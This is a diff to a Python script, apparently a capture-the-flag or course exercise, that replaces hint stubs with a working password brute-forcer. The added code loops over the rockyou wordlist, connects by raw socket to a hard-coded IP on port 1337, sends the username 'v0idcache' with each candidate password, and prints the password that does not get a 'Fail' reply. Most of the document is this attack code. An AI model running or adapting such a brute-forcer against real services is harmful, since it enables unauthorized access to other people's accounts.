@@ -24,10 +24,10 @@
 
 """
 
-import socket
-
-host = "" # IP address here
-port = 0000 # Port here
+import socket 
+ 
+host = "142.93.136.81" # IP address here
+port = 1337 # Port here
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
 
 def brute_force():
@@ -55,11 +55,26 @@ def brute_force():
             v0idcache's server.
     """
 
-    username = ""   # Hint: use OSINT
-    password = ""   # Hint: use wordlist
-
-
-
+    
+    with open(wordlist) as f:
+      for line in f:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+        username = "v0idcache\n"
+        password = line
+        s.send(username.encode('utf-8')) 
+        userPrompt = s.recv(1024).decode('utf-8')
+        print(userPrompt)
+        s.send(password.encode('utf-8'))
+        passPrompt = s.recv(1024).decode('utf-8')
+        print(passPrompt)
+        endResult = s.recv(1024).decode('utf-8')
+        print(endResult)
+        if endResult != "Fail\n" and endResult != "" and endResult != "\n":
+          print("SUCCESS\n")
+          print(password)
+          break
+    
 
 if __name__ == '__main__':
     brute_force()
